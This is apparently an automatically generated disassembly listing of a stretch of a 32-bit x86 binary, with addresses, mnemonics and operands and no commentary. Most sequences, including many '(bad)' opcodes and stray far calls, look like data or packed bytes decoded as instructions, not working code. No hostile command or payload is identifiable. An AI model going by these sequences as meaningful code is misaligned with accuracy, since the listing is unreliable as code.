  411a54:	and    DWORD PTR [edi+eax*8+0x2877aece],ebp
  411a5b:	std    
  411a5c:	xor    eax,0xa3f4886a
  411a61:	pop    edx
  411a62:	jmp    0x411aa4
  411a64:	or     DWORD PTR [eax],edx
  411a66:	stos   BYTE PTR es:[edi],al
  411a67:	(bad)  
  411a68:	(bad)  
  411a69:	jmp    DWORD PTR [eax+ecx*2-0x3a2c0001]
  411a70:	(bad)  
  411a71:	(bad)  
  411a72:	dec    DWORD PTR [ebx-0x74747475]
  411a78:	mov    ecx,DWORD PTR [ebx-0xf787475]
  411a7e:	mov    ecx,0xa3950655
  411a83:	push   ecx
  411a84:	arpl   sp,ax
  411a86:	outs   dx,DWORD PTR ds:[esi]
  411a87:	and    BYTE PTR [esp+ecx*2],0xf5
  411a8b:	cmp    al,0xfe
  411a8d:	add    eax,0xe1ce76fd
  411a92:	aad    0x1f
	...
  411a9c:	add    BYTE PTR [eax],al
  411a9e:	add    BYTE PTR [edi-0xc],ah
  411aa1:	mov    ds:0x3d53235e,al
  411aa6:	ins    DWORD PTR es:[edi],dx
  411aa7:	imul   ecx,DWORD PTR gs:[ebp+0x22],0x6572536e
  411aaf:	jo     0x411b16
  411ab1:	gs gs or eax,0x79666272
  411ab8:	jb     0x411b2d
  411aba:	imul   ecx,DWORD PTR ds:0x2066762f,0x72526d53
  411ac4:	and    dh,BYTE PTR [edi+ebp*2+0x20]
  411ac8:	je     0x411b04
  411aca:	jns    0x411aec
  411acc:	outs   dx,BYTE PTR ds:[esi]
  411acd:	jbe    0x411ad9
  411acf:	arpl   WORD PTR [ebp+0x6d],bp
  411ad2:	imul   ebp,DWORD PTR [ecx+0x6c],0x650a6720
  411ad9:	or     dl,BYTE PTR cs:[eax+0x6d]
  411add:	gs push ebx
  411adf:	add    BYTE PTR [eax],al
  411ae1:	mov    ecx,edx
  411ae3:	push   eax
  411ae4:	in     eax,0x9a
  411ae6:	inc    ecx
  411ae7:	push   cs
  411ae8:	int3   
  411ae9:	add    DWORD PTR [ebx-0x5f088c55],edi
  411aef:	xchg   BYTE PTR [edi+0x27],bh
  411af2:	retf   0xf956
  411af5:	hlt    
  411af6:	ds xor eax,0x4b95248a
  411afc:	div    bl
  411afe:	push   ss
  411aff:	sbb    eax,0xfbffd613
  411b04:	add    BYTE PTR [eax],al
  411b06:	mov    ah,0x4e
  411b08:	add    BYTE PTR [eax],al
  411b0a:	lahf   
  411b0b:	mov    WORD PTR [ebx],cs
  411b0d:	add    BYTE PTR [eax+0x3d],dl
  411b10:	les    esp,FWORD PTR [esi]
  411b12:	jecxz  0x411b15
  411b14:	addr16 aad 0x75
  411b17:	cdq    
  411b18:	sbb    BYTE PTR ds:0x636edf98,al
  411b1e:	mov    ebp,0x5de17320
  411b23:	xchg   DWORD PTR [esi+0x5],ebp
  411b26:	mov    ebp,0xc6505050
  411b2b:	dec    eax
  411b2c:	bswap  ebp
  411b2e:	cmp    al,0x0
  411b30:	fcomp  QWORD PTR [edi]
  411b32:	mov    bl,0x3e
  411b34:	pop    edx
  411b35:	push   ebp
  411b36:	adc    esi,DWORD PTR [ecx-0x5612789]
  411b3c:	stc    
  411b3d:	or     eax,0x4914e9c
  411b42:	lods   eax,DWORD PTR ss:[esi]
  411b44:	shl    DWORD PTR [ebp+0x4450505e],cl
  411b4a:	mov    WORD PTR [ebp+0x505050],ds
	...
  411b58:	loope  0x411bc2
  411b5a:	xchg   DWORD PTR [eax],eax
	...
  411b64:	add    BYTE PTR [eax],al
  411b66:	pop    ds
  411b67:	inc    edi
  411b68:	lds    ecx,FWORD PTR [esi+0x18]
  411b6b:	dec    eax
  411b6c:	jge    0x411b7a
  411b6e:	js     0x411b36
  411b70:	call   0x62f895c1
  411b75:	fiadd  DWORD PTR [eax]
  411b77:	dec    BYTE PTR [ecx-0x55]
  411b7a:	inc    edi
  411b7b:	or     eax,0xc62c
  411b80:	fwait
  411b81:	xlat   BYTE PTR ds:[ebx]
  411b82:	add    BYTE PTR [eax],al
  411b84:	and    dl,0x0
  411b87:	add    cl,dl
  411b89:	adc    cl,BYTE PTR [edx-0x778cfd28]
  411b8f:	mov    al,0xac
  411b91:	ds pop eax
  411b93:	pop    ebx
  411b94:	(bad)
  411b97:	jle    0x411b6b
  411b99:	mov    ah,BYTE PTR [ebp+0x58]
  411b9c:	cs and eax,0xbb5a
  411ba2:	pop    es
  411ba3:	mov    cl,0x64
  411ba5:	mov    ch,0x0
  411ba7:	add    BYTE PTR [eax],al
  411ba9:	jno    0x411c1e
  411bab:	imul   ebx,edi,0x57392f51
  411bb1:	dec    eax
  411bb2:	mov    ebx,0xbddb7aa3
  411bb7:	in     eax,0xe3
  411bb9:	xchg   edx,eax
  411bba:	(bad)  
  411bbc:	cmp    eax,esi
  411bbe:	bound  edx,QWORD PTR [ecx+0x5f]
  411bc1:	push   0x1b6dd019
  411bc6:	ds and eax,0x2517fe2e
  411bcc:	add    BYTE PTR [eax],al
  411bce:	mov    dh,0x3e
	...
  411bdc:	jl     0x411ba6
  411bde:	ret    0x0
  411be1:	add    BYTE PTR [eax],al
  411be3:	add    BYTE PTR [eax],al
  411be5:	add    BYTE PTR [eax],al
  411be7:	add    al,ch
  411be9:	call   0xcd9b5917
  411bee:	sub    bl,BYTE PTR [ecx+0x62d28f89]
  411bf4:	and    bh,BYTE PTR [edx+0x1431cae4]
  411bfa:	mov    eax,0x8624ac63
  411bff:	mov    edx,0x8fe8e8b6
  411c05:	call   0xa852:0xe0f5cd46
  411c0c:	int    0xab
  411c0e:	(bad)  
  411c0f:	ins    BYTE PTR es:[edi],dx
  411c10:	lahf   
  411c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c12:	xor    ebp,DWORD PTR [edi-0x9]
  411c15:	xor    al,0x2b
  411c17:	pop    eax
  411c18:	loope  0x411be0
  411c1a:	popa   
  411c1b:	jno    0x411bda
  411c1d:	cdq    
  411c1e:	int3   
  411c1f:	enter  0xe8eb,0xe8
  411c23:	gs pop ss
  411c25:	or     al,ch
  411c27:	call   0xe8e9a84b
  411c2c:	add    dh,cl
  411c2e:	cmp    BYTE PTR [ebp-0xa],dh
  411c31:	add    eax,0x5ae81191
  411c36:	icebp  
  411c37:	dec    ebx
  411c38:	bound  esi,QWORD PTR [edi+0x6e]
  411c3b:	loope  0x411c8f
  411c3d:	mov    DWORD PTR [edi-0x43],esi
  411c40:	int3   
  411c41:	sub    eax,0x7efba9
  411c46:	add    BYTE PTR [eax],al
  411c48:	mov    eax,0xe70000ec
  411c4d:	sldt   WORD PTR [eax]
  411c50:	add    BYTE PTR [ebp+0x75],dh
  411c53:	jne    0x411cca
  411c55:	jne    0x411ccc
  411c57:	jne    0x411cce
  411c59:	jne    0x411be0
  411c5b:	adc    ebx,DWORD PTR [ebp+0x37]
  411c5e:	daa    
  411c5f:	cbw    
  411c61:	cmp    eax,0x494434e5
  411c66:	mov    al,0x82
  411c68:	scas   eax,DWORD PTR es:[edi]
  411c69:	pusha  
  411c6a:	xor    ebp,DWORD PTR ds:0xe977b5b6
  411c70:	jb     0x411cad
	...
  411c7a:	add    BYTE PTR [eax],al
  411c7c:	add    BYTE PTR [esi-0x4b],ch
  411c7f:	push   esp
  411c80:	call   0x5e53:0x98ef0000
  411c87:	mov    DWORD PTR [edi+0x67],ebx
  411c8a:	mov    DWORD PTR [edi],edi
  411c8c:	outs   dx,BYTE PTR ds:[esi]
  411c8d:	addr16 jae 0x411c9d
  411c90:	jns    0x411cf7
  411c92:	ins    DWORD PTR es:[edi],dx
  411c93:	je     0x411d09
  411c95:	jp     0x411d0a
  411c97:	and    cl,BYTE PTR [ebp+0x76]
  411c9a:	and    BYTE PTR [esi],bh
  411c9c:	popa   
  411c9d:	jb     0x411d0d
  411c9f:	outs   dx,DWORD PTR ds:[esi]
  411ca0:	cmp    eax,0x650d6366
  411ca5:	and    BYTE PTR [ebp+0x20],ch
  411ca8:	outs   dx,BYTE PTR ds:[esi]
  411ca9:	jb     0x411d12
  411cab:	arpl   WORD PTR [eax],sp
  411cad:	fs je  0x411d15
  411cb0:	popa   
  411cb1:	arpl   WORD PTR [ecx+0x74],sp
  411cb4:	outs   dx,BYTE PTR ds:[esi]
  411cb5:	ja     0x411d24
  411cb7:	inc    ecx
  411cb8:	ins    DWORD PTR es:[edi],dx
  411cb9:	and    BYTE PTR [edi+0x20],ch
  411cbc:	ins    DWORD PTR es:[edi],dx
  411cbd:	gs push eax
  411cbf:	and    BYTE PTR [edi+0x64],cl
  411cc2:	jns    0x411d2b
  411cc4:	cs cs ins DWORD PTR es:[edi],dx
  411cc7:	jbe    0x411ce9
  411cc9:	fs or  eax,0x73696520
  411ccf:	je     0x411d3d
  411cd1:	and    BYTE PTR ds:0x693e6576,cl
  411cd7:	gs and BYTE PTR cs:0x72207663,cl
  411cdf:	imul   ebp,DWORD PTR [esi],0x76636d54
  411ce5:	jae    0x411d4b
  411ce7:	gs push edi
  411ce9:	and    ch,BYTE PTR [ebp+0x65]
  411cec:	arpl   WORD PTR [ebp+0x3a],sp
  411cef:	je     0x411d56
  411cf1:	bound  esi,QWORD PTR [esp+esi*2+0x6d]
  411cf5:	cs jo  0x411d61
  411cf8:	ins    BYTE PTR es:[edi],dx
  411cf9:	(bad)  [esi+0x72]
  411cfc:	jns    0x411ce2
  411cfe:	in     al,0xec
  411d00:	leave  
  411d01:	or     eax,0x8b6f4622
  411d06:	shl    DWORD PTR [esi],0xf4
  411d09:	mov    al,0x10
  411d0b:	pushf  
  411d0c:	std    
  411d0d:	data16 add BYTE PTR [esi],dh
  411d10:	pop    ss
  411d11:	into   
  411d12:	dec    esp
  411d13:	add    BYTE PTR [eax],al
  411d15:	push   es
  411d16:	dec    edi
  411d17:	add    BYTE PTR [eax],al
  411d19:	jno    0x411d57
  411d1b:	stc    
  411d1c:	add    al,ch
  411d1e:	jo     0x411ce7
  411d20:	or     DWORD PTR [edx-0x6e6d3d98],0xb6d9d973
  411d2a:	xor    al,al
  411d2c:	xchg   esp,eax
  411d2d:	sbb    DWORD PTR gs:[eax],edx
  411d30:	cmp    ebp,DWORD PTR [esi]
  411d32:	movd   mm4,edi
  411d35:	popa   
  411d36:	call   0xb0040623
  411d3b:	mov    edx,0x3b721c9a
  411d40:	mov    ecx,0xb296246
  411d45:	xchg   edi,eax
  411d46:	out    0xe4,eax
  411d48:	popa   
  411d49:	xlat   BYTE PTR ds:[ebx]
  411d4a:	jb     0x411d73
  411d4c:	hlt    
  411d4d:	dec    edi
  411d4e:	stos   BYTE PTR es:[edi],al
  411d4f:	adc    eax,0x61f48590
  411d54:	(bad)  
  411d55:	cmp    eax,0xd8b5e8e8
  411d5a:	cwde   
  411d5b:	call   0x420648
  411d60:	add    BYTE PTR [eax],al
  411d62:	add    BYTE PTR [eax],al
  411d64:	add    BYTE PTR [eax],al
  411d66:	add    BYTE PTR [esi+0x63c1],bh
	...
  411d74:	add    BYTE PTR [ebp+0x4e],ah
  411d77:	xor    DWORD PTR [esi-0x34beaa1e],ecx
  411d7d:	push   esp
  411d7e:	aad    0xb6
  411d80:	jl     0x411df2
  411d82:	enter  0xd833,0x7a
  411d86:	daa    
  411d87:	and    BYTE PTR [edx],ah
  411d89:	call   0x3700:0x75b32
  411d90:	outs   dx,BYTE PTR ds:[esi]
  411d91:	add    BYTE PTR [eax],al
  411d93:	jmp    0xb6c7:0x2600006c
  411d9a:	jo     0x411d7b
  411d9c:	inc    ecx
  411d9d:	sub    DWORD PTR [edx+0x5c49e52b],eax
  411da3:	inc    ecx
  411da4:	mov    cx,bx
  411da7:	pop    esp
  411da8:	mov    ebp,0x12bbe47e
  411dad:	fucom  st(2)
  411daf:	add    bh,bh
  411db1:	pushf  
  411db2:	(bad)  
  411db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db4:	cld    
  411db5:	(bad)  
  411db6:	(bad)  
  411db7:	(bad)  
  411db8:	in     al,dx
  411db9:	mov    dl,dh
  411dbb:	jecxz  0x411dae
  411dbd:	dec    eax
  411dbe:	add    bh,BYTE PTR [edx-0x27]
  411dc1:	retf   
  411dc2:	push   ebx
  411dc3:	or     eax,0xbc9a1763
  411dc8:	icebp  
  411dc9:	dec    esi
  411dca:	mov    edx,0xb4651f72
  411dcf:	push   ebx
  411dd0:	dec    edx
  411dd1:	sbb    BYTE PTR [ebx-0xa],al
  411dd4:	xchg   DWORD PTR [edi],esp
  411dd6:	test   DWORD PTR ds:0xff4519a1,eax
  411ddc:	call   DWORD PTR [ecx-0x2c]
  411ddf:	(bad)  
  411de0:	(bad)  
  411de1:	inc    DWORD PTR [eax]
	...
  411deb:	rcl    DWORD PTR [edi-0x6e],cl
  411dee:	(bad)  
  411def:	(bad)  
  411df0:	(bad)  
  411df1:	(bad)  
  411df2:	(bad)  
  411df3:	(bad)  
  411df4:	(bad)  
  411df5:	(bad)  
  411df6:	inc    DWORD PTR [eax]
  411df8:	add    bl,cl
  411dfa:	and    cl,bl
  411dfc:	mov    dh,0x2f
  411dfe:	mov    cs,ebp
  411e00:	icebp  
  411e01:	push   es
  411e02:	add    DWORD PTR [esi],eax
  411e04:	sub    eax,ebx
  411e06:	test   DWORD PTR [esi],ebx
  411e08:	push   edi
  411e09:	mov    cl,0xab
  411e0b:	stc    
  411e0c:	stos   BYTE PTR es:[edi],al
  411e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e0e:	les    esp,FWORD PTR [edx]
  411e10:	cdq    
  411e11:	add    BYTE PTR [eax],al
  411e13:	inc    ebp
  411e14:	mov    edx,0xf168a774
  411e19:	pop    eax
  411e1a:	add    ebx,DWORD PTR [edi-0x76]
  411e1d:	lods   eax,DWORD PTR ds:[esi]
  411e1e:	push   edi
  411e1f:	push   ss
  411e20:	push   esp
  411e21:	imul   ecx,DWORD PTR [eax-0x2d],0xc21c5ebe
  411e28:	pusha  
  411e29:	shl    BYTE PTR [ecx-0x3ad5141c],1
  411e2f:	pop    ecx
  411e30:	add    BYTE PTR [eax],al
  411e32:	sub    eax,0x85bb
  411e37:	xor    al,0x2e
  411e39:	retf   
  411e3a:	add    bh,bh
  411e3c:	(bad)
  411e3f:	pushf  
  411e40:	adc    DWORD PTR [edi-0x45ce3df9],ebp
  411e46:	popa   
  411e47:	mov    dl,BYTE PTR [eax]
  411e49:	adc    eax,0xd334ad42
  411e4e:	sbb    ecx,edi
  411e50:	inc    eax
  411e51:	gs pop eax
  411e53:	xchg   ebx,eax
  411e54:	(bad)  
  411e55:	(bad)  
  411e56:	call   DWORD PTR [edi+0x5]
  411e59:	(bad)  
  411e5a:	push   DWORD PTR [ebx+0x61]
  411e5d:	(bad)  
  411e5e:	(bad)  
  411e5f:	inc    DWORD PTR [eax]
	...
  411e69:	cld    
  411e6a:	nop
  411e6b:	pop    esi
  411e6c:	ja     0x411eae
  411e6e:	outs   dx,BYTE PTR ds:[esi]
  411e6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e70:	js     0x411e78
  411e72:	xor    edi,DWORD PTR [esi-0xf]
  411e75:	(bad)  
  411e76:	div    edi
  411e78:	aas    
  411e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e7a:	stos   BYTE PTR es:[edi],al
  411e7b:	sub    edi,DWORD PTR [edi+0x2a2f9624]
  411e81:	call   0xe92a076e
  411e86:	call   0x12a0773
  411e8b:	add    BYTE PTR [esi],bh
  411e8d:	mov    BYTE PTR [eax+0x3a00006f],dh
  411e93:	out    dx,eax
  411e94:	test   eax,edi
  411e96:	push   esi
  411e97:	xor    al,0xed
  411e99:	hlt    
  411e9a:	std    
  411e9b:	neg    BYTE PTR [ecx-0x13]
  411e9e:	push   0x50
  411ea0:	not    DWORD PTR [edx]
  411ea2:	lahf   
  411ea3:	fwait
  411ea4:	imul   ecx,DWORD PTR [ebx-0x33],0xffffffcb
  411ea8:	(bad)  
  411ea9:	and    BYTE PTR [ebx-0x24],0xe9
  411ead:	scas   al,BYTE PTR es:[edi]
  411eae:	cmp    DWORD PTR [ecx-0x2a576140],esi
  411eb4:	jmp    0x411eb6
  411eb6:	add    BYTE PTR [ebp+0x49],bh
  411eb9:	add    BYTE PTR [eax],al
  411ebb:	pop    ecx
  411ebc:	sahf   
  411ebd:	lods   al,BYTE PTR ds:[esi]
  411ebe:	add    bh,bh
  411ec0:	aad    0x3c
  411ec2:	pusha  
  411ec3:	imul   eax,DWORD PTR ds:0x1f9bf1dc,0x2f
  411eca:	arpl   si,cx
  411ecc:	pop    es
  411ecd:	(bad)  
  411ece:	pusha  
  411ecf:	cdq    
  411ed0:	test   al,0x27
  411ed2:	outs   dx,DWORD PTR ds:[esi]
  411ed3:	inc    esp
  411ed4:	lahf   
  411ed5:	pushf  
  411ed6:	imul   edx,DWORD PTR [esi-0x1],0xcb48ffff
  411edd:	or     ebx,esp
  411edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ee0:	(bad)  
  411ee1:	jo     0x411eee
  411ee3:	scas   eax,DWORD PTR es:[edi]
  411ee4:	mov    ah,0x27
  411ee6:	and    ebx,esp
  411ee8:	aad    0xdf
  411eea:	(bad)  
  411eec:	jne    0x411f69
  411eee:	jg     0x411f44
  411ef0:	mov    al,ds:0x739eccd6
  411ef5:	sbb    al,0x6e
  411ef7:	into   
  411ef8:	(bad)  
  411ef9:	inc    DWORD PTR [eax+esi*2+0x45]
  411efd:	(bad)  
  411efe:	(bad)  
  411eff:	inc    DWORD PTR [eax]
	...
  411f09:	repz mov dl,0xb8
  411f0c:	mov    ecx,DWORD PTR [ebx-0x74747475]
  411f12:	mov    ecx,DWORD PTR [ebx-0x75ffff75]
  411f18:	pushf  
  411f19:	(bad)  
  411f1a:	mov    edi,0x7dfe5240
  411f1f:	cmp    eax,0xecb7a97c
  411f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f25:	test   DWORD PTR [esp+edi*2],ebx
  411f28:	int    0xc9
  411f2a:	adc    BYTE PTR [ebp+0xd4ad99],dh
  411f30:	add    BYTE PTR [edx],bl
  411f32:	enter  0x0,0x9e
  411f36:	dec    esp
  411f37:	add    BYTE PTR [eax],al
  411f39:	mov    ah,cl
  411f3b:	pusha  
  411f3c:	pop    ecx
  411f3d:	je     0x411ed4
  411f3f:	xchg   esi,eax
  411f40:	adc    ebx,DWORD PTR [eax+0x45]
  411f43:	push   eax
  411f44:	fdivrp st(7),st
  411f46:	cmp    esi,DWORD PTR [esi]
  411f48:	test   DWORD PTR [ebp-0x4019d8bc],0x681bb7
  411f52:	xor    ebx,ebx
  411f54:	sbb    DWORD PTR [ebx+0x3333338d],eax
  411f5a:	mov    WORD PTR [ebp-0x5f],?
  411f5d:	call   0xd341:0x251fdeab
  411f64:	popa   
  411f65:	call   0x2eed:0xb9de3f0a
  411f6c:	scas   al,BYTE PTR es:[edi]
  411f6d:	iret   
  411f6e:	jno    0x411f1a
  411f70:	xchg   ebp,eax
  411f71:	mov    esp,0x9f06fe04
  411f76:	jo     0x411fb3
  411f78:	ret    
  411f79:	bound  edx,QWORD PTR [ebx]
  411f7b:	fs (bad) 
  411f7d:	xor    esi,DWORD PTR [ebx]
  411f7f:	(bad)  
  411f80:	pushf  
  411f81:	xor    esi,DWORD PTR [ebx]
  411f83:	xor    esi,DWORD PTR [ebp+0x75]
  411f86:	jne    0x411ffd
  411f88:	jne    0x411fff
  411f8a:	jne    0x412001
  411f8c:	jne    0x411fb5
  411f8e:	scas   eax,DWORD PTR es:[edi]
  411f8f:	cmp    al,0x83
  411f91:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  411f98:	add    DWORD PTR [eax],0x0
  411f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f9c:	add    eax,0xb6168a41
  411fa1:	mov    cl,0xb0
  411fa3:	cmp    al,0x17
  411fa5:	sub    BYTE PTR [ebx],dh
  411fa7:	je     0x411f70
  411fa9:	push   ecx
  411faa:	xchg   BYTE PTR [ebx+0x1a],dh
  411fad:	inc    esi
  411fae:	mov    DWORD PTR [ecx-0x20],ebx
  411fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fb2:	push   ebx
  411fb3:	add    BYTE PTR [eax],al
  411fb5:	xchg   ebx,eax
  411fb6:	xor    BYTE PTR [esi-0x21b4d4ee],al
  411fbc:	stos   DWORD PTR es:[edi],eax
  411fbd:	sub    ah,BYTE PTR [esi+0x77]
  411fc0:	sbb    BYTE PTR [ecx],0xb2
  411fc3:	sbb    DWORD PTR ds:0x713503,ebp
  411fc9:	push   0x1a
  411fcb:	mov    ds:0xa4bddcc9,eax
  411fd0:	mov    al,ds:0x74
  411fd5:	mov    bh,0x7a
  411fd7:	add    BYTE PTR [eax],al
  411fd9:	stos   BYTE PTR es:[edi],al
  411fda:	(bad)  
  411fdb:	add    BYTE PTR [bp+di],dh
  411fde:	xchg   ebp,eax
  411fdf:	das    
  411fe0:	jb     0x41205a
  411fe2:	pop    ebp
  411fe3:	ret    
  411fe4:	test   eax,0xb603f65d
  411fe9:	push   ebx
  411fea:	nop
  411feb:	mov    eax,0xcb08005d
  411ff0:	sahf   
  411ff1:	jecxz  0x411f94
  411ff3:	retf   0x1ff2
  411ff6:	xor    esi,DWORD PTR [ebx]
  411ff8:	xor    edi,DWORD PTR [ebp+edx*1+0x33]
  411ffc:	xor    esi,DWORD PTR [ebp+0x33333356]
	...
  41200a:	add    BYTE PTR [ebx+0x67],bl
  41200d:	sub    edx,eax
  41200f:	cdq    
  412010:	dec    esi
  412011:	fdivr  QWORD PTR [edx+0x3d3d92e7]
  412017:	popa   
  412018:	mov    dh,0xb3
  41201a:	nop
  41201b:	(bad)  
  41201c:	adc    BYTE PTR [ebx*1+0x3829a52a],dh
  412023:	(bad)  
  412024:	(bad)  
  412026:	and    BYTE PTR [esi],ch
  412028:	or     cl,BYTE PTR [edx]
  41202a:	gs gs inc ecx
  41202d:	outs   dx,DWORD PTR ds:[esi]
  41202e:	push   ebx
  41202f:	imul   eax,DWORD PTR [esp+edi*1+0xd],0x75616463
  412037:	or     ch,BYTE PTR [esi+ebp*1+0x72]
  41203b:	push   ebx
  41203c:	outs   dx,BYTE PTR ds:[esi]
  41203d:	and    esi,DWORD PTR [ebx+0x74]
  412040:	outs   dx,BYTE PTR ds:[esi]
  412041:	arpl   WORD PTR [edi+0x2e],bp
  412044:	outs   dx,BYTE PTR ds:[esi]
  412045:	ins    DWORD PTR es:[edi],dx
  412046:	and    BYTE PTR [ebp+0x65],ch
  412049:	outs   dx,BYTE PTR ds:[esi]
  41204a:	ins    DWORD PTR es:[edi],dx
  41204b:	outs   dx,DWORD PTR ds:[esi]
  41204c:	gs jns 0x4120b4
  41204f:	ins    DWORD PTR es:[edi],dx
  412050:	bound  esp,QWORD PTR [eax]
  412052:	outs   dx,DWORD PTR ds:[esi]
  412053:	outs   dx,DWORD PTR ds:[esi]
  412054:	popa   
  412055:	and    BYTE PTR [ebp+0x20],ch
  412058:	jno    0x4120c3
  41205a:	popa   
  41205b:	popa   
  41205c:	gs je  0x4120c4
  41205f:	cmp    ah,BYTE PTR [ebx+0xd]
  412062:	gs and esp,DWORD PTR cs:[eax]
  412066:	gs outs dx,BYTE PTR gs:[esi]
  412069:	outs   dx,BYTE PTR ds:[esi]
  41206a:	inc    ecx
  41206b:	gs inc ecx
  41206d:	and    BYTE PTR gs:[eax],ah
  412070:	jae    0x4120d7
  412072:	jae    0x4120e1
  412074:	ins    DWORD PTR es:[edi],dx
  412075:	(bad)  
  412076:	(bad)  
  412077:	(bad)  
  412078:	(bad)  
  412079:	(bad)  
  41207a:	(bad)  
  41207b:	sldt   WORD PTR [eax]
  41207e:	dec    ecx
  41207f:	push   cs
  412080:	(bad)  
  412081:	sub    al,0x0
  412083:	add    BYTE PTR [esi],cl
  412085:	repz mov eax,ds:0xc41d73ea
  41208b:	ins    DWORD PTR es:[edi],dx
  41208c:	cmp    al,0x44
  41208e:	pop    ebp
  41208f:	outs   dx,BYTE PTR ds:[esi]
  412090:	mov    ch,cl
  412092:	push   esi
  412093:	xor    esp,DWORD PTR [ebp-0x5717751c]
  412099:	mov    BYTE PTR [eax+0x34],0x47
  41209d:	sub    eax,0x986e16ed
  4120a2:	loope  0x41202a
  4120a4:	push   0x3778
  4120a9:	push   0x1c
  4120ab:	add    BYTE PTR [eax],al
  4120ad:	(bad)  
  4120ae:	cmp    ebx,DWORD PTR [ebp-0x47987700]
  4120b4:	xchg   esi,ebp
  4120b6:	push   0x24b5f6e5
  4120bb:	nop
  4120bc:	mov    esi,0xf0ccc145
  4120c1:	inc    esp
  4120c2:	add    BYTE PTR [ebx-0x6b],bh
  4120c5:	sbb    bh,BYTE PTR [edi-0x1a]
  4120c8:	jo     0x41206c
  4120ca:	mov    DWORD PTR [ecx+0x4b609489],ecx
  4120d0:	(bad)  
  4120d1:	cwde   
  4120d2:	test   eax,0xd820af7a
  4120d7:	sub    ch,dl
  4120d9:	scas   al,BYTE PTR es:[edi]
  4120da:	call   0x22ff:0xd8b41131
  4120e1:	je     0x412063
  4120e3:	in     eax,0x86
  4120e5:	or     ecx,DWORD PTR [edi-0x76cfe3b2]
  4120eb:	mov    DWORD PTR [ebx+0x1d],ebx
  4120ee:	sti    
  4120ef:	mov    DWORD PTR [ecx+0x74747489],ecx
  4120f5:	je     0x41216b
  4120f7:	je     0x41216d
  4120f9:	je     0x41216f
  4120fb:	inc    ebx
  4120fd:	les    ecx,FWORD PTR [ecx-0x76767677]
  412103:	mov    DWORD PTR [ecx-0x7677],ecx
  412109:	lods   al,BYTE PTR ds:[esi]
  41210a:	(bad)  [edi+ebp*8]
  41210d:	xchg   ebx,eax
  41210e:	mov    ds:0xa6965682,eax
  412113:	jo     0x4120e0
  412115:	int3   
  412116:	mov    esi,0x57570005
  41211b:	cmp    cl,dl
  41211d:	sub    BYTE PTR [edi+eiz*4-0x69000078],ch
  412124:	aad    0xff
  412126:	push   edx
  412128:	jp     0x412129
  41212a:	inc    DWORD PTR [ecx]
  41212c:	out    dx,al
  41212d:	dec    eax
  41212e:	xor    ebx,DWORD PTR [ecx-0x5f]
  412131:	pop    eax
  412132:	jbe    0x412122
  412134:	and    bh,BYTE PTR [edi-0x5b91252d]
  41213a:	or     edx,esi
  41213c:	xchg   ebp,eax
  41213d:	xchg   ecx,eax
  41213e:	sub    eax,0x2865ece8
  412143:	dec    esp
  412145:	and    edx,esi
  412147:	dec    eax
  412148:	inc    edi
  412149:	int3   
  41214a:	int3   
  41214b:	int3   
  41214c:	retf   0x38fd
  41214f:	adc    edi,ecx
  412151:	pop    edx
  412152:	ret    0x62c4
  412155:	sbb    ecx,DWORD PTR ss:[eax+ebx*2+0x1ee94c0f]
  41215d:	(bad)  
  41215e:	sbb    al,0x86
  412160:	(bad)  
  412161:	shl    DWORD PTR ds:0x4c075dfe,cl
  412167:	push   esi
  412168:	jns    0x4121b0
  41216a:	addr16 push es
  41216c:	fsub   QWORD PTR ds:0xdbcccc54
  412172:	mov    eax,ds:0xe8cccccc
  412177:	call   0xe92a0a64
  41217c:	call   0x6f710a69
  412181:	ror    DWORD PTR [ebp-0x72727273],1
  412187:	lea    ecx,[ebp+0x8d8d]
  41218d:	(bad)  
  41218e:	(bad)  [ecx]
  412190:	or     eax,esi
  412192:	cld    
  412193:	js     0x4121a8
  412195:	add    DWORD PTR [eax+0x6],edx
  412198:	data16 mov dl,0x18
  41219b:	lods   al,BYTE PTR ds:[esi]
  41219d:	pop    es
  41219e:	xor    BYTE PTR [edi+0x28e2692d],cl
  4121a4:	lock add BYTE PTR [eax],al
  4121a7:	ins    DWORD PTR es:[edi],dx
  4121a8:	jnp    0x4121a8
  4121aa:	push   ebx
  4121ab:	stc    
  4121ac:	mov    bl,0x92
  4121ae:	pop    esi
  4121af:	out    dx,al
  4121b0:	int    0x8b
  4121b2:	mov    ds:0xfa91d5e9,al
  4121b7:	mov    WORD PTR [esi],gs
  4121b9:	push   esp
  4121ba:	pop    edi
  4121bb:	mov    DWORD PTR [eax-0x441e3645],esi
  4121c1:	rcl    edi,0xb4
  4121c4:	add    BYTE PTR [eax],al
  4121c6:	mov    edx,0xed1a
  4121cb:	fimul  WORD PTR [ebx]
  4121cd:	inc    esi
  4121ce:	add    BYTE PTR [ebp+0x43],dh
  4121d1:	(bad)  
  4121d2:	xchg   ebp,eax
  4121d3:	jge    0x41215a
  4121d5:	xor    BYTE PTR [esi],0x38
  4121d8:	int3   
  4121d9:	iret   
  4121da:	imul   ebp,DWORD PTR [ebx],0xd1112c4e
  4121e0:	mov    edi,0xe1e87ef
  4121e5:	adc    al,0xf3
  4121e7:	sbb    al,0x75
  4121e9:	jne    0x412260
  4121eb:	pusha  
  4121ec:	lods   eax,DWORD PTR ds:[esi]
  4121ed:	jne    0x412264
  4121ef:	jg     0x4121e9
  4121f1:	jne    0x412268
  4121f3:	jne    0x4121f5
	...
  4121fd:	xor    ecx,DWORD PTR [ebp+esi*1-0x46e0f827]
  412204:	les    ebp,FWORD PTR [ecx+0x4]
  412207:	push   esp
  412208:	out    dx,al
  412209:	pop    ds
  41220a:	fwait
  41220b:	and    eax,0xfe5317ab
  412210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412211:	(bad)  
  412212:	cmp    edi,ecx
  412214:	stos   BYTE PTR es:[edi],al
  412215:	(bad)  
  412216:	(bad)  
  412217:	(bad)  
  412218:	(bad)  
  412219:	(bad)  
  41221a:	(bad)  
  41221b:	(bad)  
  41221c:	(bad)  
  41221d:	inc    DWORD PTR [eax]
  41221f:	add    BYTE PTR [edi+0xf5aded],ch
  412225:	add    BYTE PTR [edx-0x107348a9],bh
